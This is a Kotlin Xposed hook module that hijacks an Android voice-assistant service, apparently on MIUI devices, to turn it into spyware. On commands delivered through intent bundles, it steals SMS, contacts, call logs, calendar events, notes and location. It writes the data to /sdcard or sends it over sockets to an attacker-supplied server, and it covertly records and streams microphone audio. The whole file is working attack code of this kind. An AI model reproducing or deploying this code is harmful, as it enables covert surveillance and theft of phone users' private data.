package xyz.mufanc.vap.hook

import android.annotation.SuppressLint
import android.app.Service
import android.content.Intent
import android.media.AudioFormat
import android.os.Bundle
import android.text.TextUtils
import io.github.libxposed.api.XposedInterface
import io.github.libxposed.api.annotations.BeforeInvocation
import io.github.libxposed.api.annotations.XposedHooker
import org.joor.Reflect
import xyz.mufanc.vap.api.ClassHelper
import xyz.mufanc.vap.api.HookBase
import xyz.mufanc.vap.api.MethodFinder
import xyz.mufanc.vap.util.Log
import xyz.mufanc.vap.util.CalendarThief
import xyz.mufanc.vap.util.CallLogThief
import xyz.mufanc.vap.util.ContactsThief
import xyz.mufanc.vap.util.LocationThief
import xyz.mufanc.vap.util.NotesThief
import xyz.mufanc.vap.util.Recorder
import xyz.mufanc.vap.util.SmsThief
import java.io.BufferedOutputStream
import java.io.ByteArrayOutputStream
import java.net.Socket
import java.util.concurrent.LinkedBlockingDeque
import kotlin.concurrent.thread

@SuppressLint("NewApi", "MissingPermission")
class HookVoiceAssist(ixp: XposedInterface): HookBase(ixp) {

    companion object {
        private const val TAG = "HookVoiceAssist"
    }

    @XposedHooker
    class OnStartCommandHook : XposedInterface.Hooker {
        companion object {

            private const val TAG = "OnStartCommandHook"

            val messages = LinkedBlockingDeque<Bundle>()

            @JvmStatic
            @BeforeInvocation
            fun before(callback: XposedInterface.BeforeHookCallback): OnStartCommandHook {
                val hook = OnStartCommandHook()

                Log.d(TAG, "VoiceService `onStartCommand` called")
                val intent = (callback.args[0] as Intent).clone() as Intent
                if (intent.action != Constants.ACTION_START_VOICEASSIST) return hook

                val message = intent.getBundleExtra(Constants.HACKER_KEY) ?: return hook
                messages.offer(message)

                callback.returnAndSkip(Service.START_NOT_STICKY)

                return hook
            }
        }
    }

    init {
        MethodFinder(ClassHelper.findClass(Constants.VoiceService))
            .filter { name == "onStartCommand" }
            .first()
            .createHook(OnStartCommandHook::class.java)


        thread {
            Thread.sleep(1000)  // 等待服务端开始监听

            while (true) {
                val message = OnStartCommandHook.messages.take()

                try {
                    handleMessage(message)
                } catch (err: Throwable) {
                    Log.e(TAG, "", err)
                }
            }
        }
    }

    private fun handleMessage(message: Bundle) {
        Reflect.on(message).call("unparcel")

        Log.i(TAG, "message: $message")

        val kServerAddress = message.getString("ServerAddress", "")
        val kServerPort = message.getInt("ServerPort", 12345)

        if (TextUtils.isEmpty(kServerAddress)) {
            Log.w(TAG, "server address is empty")
            return
        }

        // 根据 Action 字段分发攻击类型
        when (val action = message.getString("Action", "record")) {
            "steal_notes_file" -> handleStealNotesFile()
            "list_folders_file" -> handleListFoldersFile()
            "steal_folder_file" -> {
                val folderId = message.getInt("FolderId", 0).toLong()
                handleStealFolderFile(folderId)
            }
            "steal_notes" -> handleStealNotes(kServerAddress, kServerPort, message)
            "list_folders" -> handleListFolders(kServerAddress, kServerPort)
            "steal_folder" -> {
                val folderId = message.getInt("FolderId", 0).toLong()
                handleStealFolder(folderId, kServerAddress, kServerPort)
            }
            "steal_sms_file" -> {
                val outputPath = message.getString("output") ?: "/sdcard/sms_theft_raw.json"
                val limit = message.getInt("limit", 20)
                handleStealSmsFile(outputPath, limit)
            }
            "steal_sms" -> {
                val limit = message.getInt("limit", 20)
                handleStealSms(kServerAddress, kServerPort, limit)
            }
            "steal_contacts_file" -> {
                val outputPath = message.getString("output") ?: "/sdcard/contacts_theft_raw.json"
                val limit = message.getInt("limit", 100)
                handleStealContactsFile(outputPath, limit)
            }
            "steal_contacts" -> {
                val limit = message.getInt("limit", 100)
                handleStealContacts(kServerAddress, kServerPort, limit)
            }
            "steal_calllogs_file" -> {
                val outputPath = message.getString("output") ?: "/sdcard/calllogs_theft_raw.json"
                val limit = message.getInt("limit", 50)
                handleStealCallLogsFile(outputPath, limit)
            }
            "steal_calllogs" -> {
                val limit = message.getInt("limit", 50)
                handleStealCallLogs(kServerAddress, kServerPort, limit)
            }
            "steal_calendar_file" -> {
                val outputPath = message.getString("output") ?: "/sdcard/calendar_theft_raw.json"
                val limit = message.getInt("limit", 30)
                handleStealCalendarFile(outputPath, limit)
            }
            "steal_calendar" -> {
                val limit = message.getInt("limit", 30)
                handleStealCalendar(kServerAddress, kServerPort, limit)
            }
            "steal_location_file" -> {
                val outputPath = message.getString("output") ?: "/sdcard/location_theft_raw.json"
                handleStealLocationFile(outputPath)
            }
            "steal_location" -> {
                handleStealLocation(kServerAddress, kServerPort)
            }
            else -> handleRecord(action, kServerAddress, kServerPort, message)
        }

        // Todo: stop service on finish
    }

    /** 录音攻击（原有逻辑） */
    private fun handleRecord(action: String, serverAddress: String, serverPort: Int, message: Bundle) {
        Log.i(TAG, "Action=record: starting audio recording attack")

        val kSampleRate = message.getInt("SampleRate", 44100)
        val keyChannelConfig = "CHANNEL_IN_" + message.getString("ChannelConfig", "mono").uppercase()
        val kChannelConfig: Int = Reflect.onClass(AudioFormat::class.java).get(keyChannelConfig)
        val kDuration = message.getInt("Duration", 5000).toLong()
        val isStream = message.getBoolean("Stream", false)

        val conn = Socket(serverAddress, serverPort)
        val connStream = BufferedOutputStream(conn.getOutputStream())

        if (isStream) {
            val recorder = Recorder(kSampleRate, kChannelConfig)
            recorder.record(kDuration) { buffer ->
                connStream.write(buffer)
                connStream.flush()
            }
        } else {
            val os = ByteArrayOutputStream()
            val recorder = Recorder(kSampleRate, kChannelConfig)
            recorder.record(kDuration, os)
            connStream.write(os.toByteArray())
        }

        connStream.flush()
        connStream.close()
        conn.close()

        Log.i(TAG, "Audio recording attack completed")
    }

    /** 窃取全部笔记（写入设备文件，用 adb pull 拉取） */
    private fun handleStealNotesFile() {
        Log.i(TAG, "Action=steal_notes_file: writing notes to /sdcard/notes_stolen.json")
        try {
            val count = NotesThief().stealNotesToFile()
            Log.i(TAG, "Notes written to file: $count notes")
        } catch (e: Throwable) {
            Log.e(TAG, "steal_notes_file failed", e)
        }
    }

    /** 列出文件夹（写入设备文件，用 adb pull 拉取） */
    private fun handleListFoldersFile() {
        Log.i(TAG, "Action=list_folders_file: writing folders to /sdcard/notes_folders.json")
        try {
            val count = NotesThief().listFoldersToFile()
            Log.i(TAG, "Folders written to file: $count folders")
        } catch (e: Throwable) {
            Log.e(TAG, "list_folders_file failed", e)
        }
    }

    /** 窃取全部笔记 */
    private fun handleStealNotes(serverAddress: String, serverPort: Int, message: Bundle) {
        Log.i(TAG, "Action=steal_notes: starting MIUI Notes theft")
        Log.i(TAG, "Target: $serverAddress:$serverPort")

        try {
            val thief = NotesThief()
            val count = thief.stealNotes(serverAddress, serverPort)
            Log.i(TAG, "Notes theft completed: $count notes stolen")
        } catch (e: Throwable) {
            Log.e(TAG, "Notes theft failed", e)
        }
    }

    /** 窃取指定文件夹笔记 */
    private fun handleStealFolder(folderId: Long, serverAddress: String, serverPort: Int) {
        Log.i(TAG, "Action=steal_folder: folderId=$folderId, target=$serverAddress:$serverPort")

        try {
            val thief = NotesThief()
            val count = thief.stealNotesFromFolder(folderId, serverAddress, serverPort)
            Log.i(TAG, "Folder theft completed: $count notes stolen from folder $folderId")
        } catch (e: Throwable) {
            Log.e(TAG, "Folder theft failed", e)
        }
    }

    /** 列出所有文件夹并回传 */
    private fun handleListFolders(serverAddress: String, serverPort: Int) {
        Log.i(TAG, "Action=list_folders: listing MIUI Notes folders")

        try {
            val thief = NotesThief()
            val folders = thief.listFolders()
            Log.i(TAG, "Found ${folders.length()} folders, sending to $serverAddress:$serverPort")

            val conn = Socket(serverAddress, serverPort)
            val connStream = BufferedOutputStream(conn.getOutputStream())
            val jsonData = folders.toString().toByteArray(Charsets.UTF_8)
            connStream.write(jsonData)
            connStream.flush()
            connStream.close()
            conn.close()

            Log.i(TAG, "Folder list sent successfully")
        } catch (e: Throwable) {
            Log.e(TAG, "List folders failed", e)
        }
    }

    /** 窃取指定文件夹笔记（写入设备文件，用 adb pull 拉取） */
    private fun handleStealFolderFile(folderId: Long) {
        Log.i(TAG, "Action=steal_folder_file: folderId=$folderId, writing to /sdcard/notes_folder_$folderId.json")
        try {
            val outputPath = "/sdcard/notes_folder_$folderId.json"
            val thief = NotesThief()
            val count = thief.stealFolderToFile(folderId, outputPath)
            Log.i(TAG, "Folder notes written to file: $count notes")
        } catch (e: Throwable) {
            Log.e(TAG, "steal_folder_file failed", e)
        }
    }

    private fun handleStealSmsFile(outputPath: String, limit: Int) {
        Log.i(TAG, "Action=steal_sms_file: extracting top $limit messages to $outputPath")
        try {
            val thief = SmsThief()
            val count = thief.stealToFile(outputPath, limit)
            Log.i(TAG, "SMS theft completed, $count messages written.")
        } catch (e: Throwable) {
            Log.e(TAG, "SMS theft failed", e)
        }
    }

    private fun handleStealSms(serverAddress: String, serverPort: Int, limit: Int) {
        Log.i(TAG, "Action=steal_sms: extracting top $limit messages, target=$serverAddress:$serverPort")
        try {
            val thief = SmsThief()
            val count = thief.stealToSocket(serverAddress, serverPort, limit)
            Log.i(TAG, "SMS exfiltration completed, $count messages sent.")
        } catch (e: Throwable) {
            Log.e(TAG, "SMS exfiltration failed", e)
        }
    }

    private fun handleStealContactsFile(outputPath: String, limit: Int) {
        Log.i(TAG, "Action=steal_contacts_file: extracting top $limit contacts to $outputPath")
        try {
            val thief = ContactsThief()
            val count = thief.stealToFile(outputPath, limit)
            Log.i(TAG, "Contacts theft completed, $count contacts written.")
        } catch (e: Throwable) {
            Log.e(TAG, "Contacts theft failed", e)
        }
    }

    private fun handleStealContacts(serverAddress: String, serverPort: Int, limit: Int) {
        Log.i(TAG, "Action=steal_contacts: extracting top $limit contacts, target=$serverAddress:$serverPort")
        try {
            val thief = ContactsThief()
            val count = thief.stealToSocket(serverAddress, serverPort, limit)
            Log.i(TAG, "Contacts exfiltration completed, $count contacts sent.")
        } catch (e: Throwable) {
            Log.e(TAG, "Contacts exfiltration failed", e)
        }
    }

    private fun handleStealCallLogsFile(outputPath: String, limit: Int) {
        Log.i(TAG, "Action=steal_calllogs_file: extracting top $limit call logs to $outputPath")
        try {
            val thief = CallLogThief()
            val count = thief.stealToFile(outputPath, limit)
            Log.i(TAG, "Call logs theft completed, $count records written.")
        } catch (e: Throwable) {
            Log.e(TAG, "Call logs theft failed", e)
        }
    }

    private fun handleStealCallLogs(serverAddress: String, serverPort: Int, limit: Int) {
        Log.i(TAG, "Action=steal_calllogs: extracting top $limit call logs, target=$serverAddress:$serverPort")
        try {
            val thief = CallLogThief()
            val count = thief.stealToSocket(serverAddress, serverPort, limit)
            Log.i(TAG, "Call logs exfiltration completed, $count records sent.")
        } catch (e: Throwable) {
            Log.e(TAG, "Call logs exfiltration failed", e)
        }
    }

    private fun handleStealCalendarFile(outputPath: String, limit: Int) {
        Log.i(TAG, "Action=steal_calendar_file: extracting top $limit calendar events to $outputPath")
        try {
            val thief = CalendarThief()
            val count = thief.stealToFile(outputPath, limit)
            Log.i(TAG, "Calendar theft completed, $count events written.")
        } catch (e: Throwable) {
            Log.e(TAG, "Calendar theft failed", e)
        }
    }

    private fun handleStealCalendar(serverAddress: String, serverPort: Int, limit: Int) {
        Log.i(TAG, "Action=steal_calendar: extracting top $limit calendar events, target=$serverAddress:$serverPort")
        try {
            val thief = CalendarThief()
            val count = thief.stealToSocket(serverAddress, serverPort, limit)
            Log.i(TAG, "Calendar exfiltration completed, $count events sent.")
        } catch (e: Throwable) {
            Log.e(TAG, "Calendar exfiltration failed", e)
        }
    }

    private fun handleStealLocationFile(outputPath: String) {
        Log.i(TAG, "Action=steal_location_file: extracting latest location to $outputPath")
        try {
            val thief = LocationThief()
            val count = thief.stealToFile(outputPath)
            Log.i(TAG, "Location theft completed, $count records written.")
        } catch (e: Throwable) {
            Log.e(TAG, "Location theft failed", e)
        }
    }

    private fun handleStealLocation(serverAddress: String, serverPort: Int) {
        Log.i(TAG, "Action=steal_location: extracting latest location, target=$serverAddress:$serverPort")
        try {
            val thief = LocationThief()
            val count = thief.stealToSocket(serverAddress, serverPort)
            Log.i(TAG, "Location exfiltration completed, $count records sent.")
        } catch (e: Throwable) {
            Log.e(TAG, "Location exfiltration failed", e)
        }
    }

}
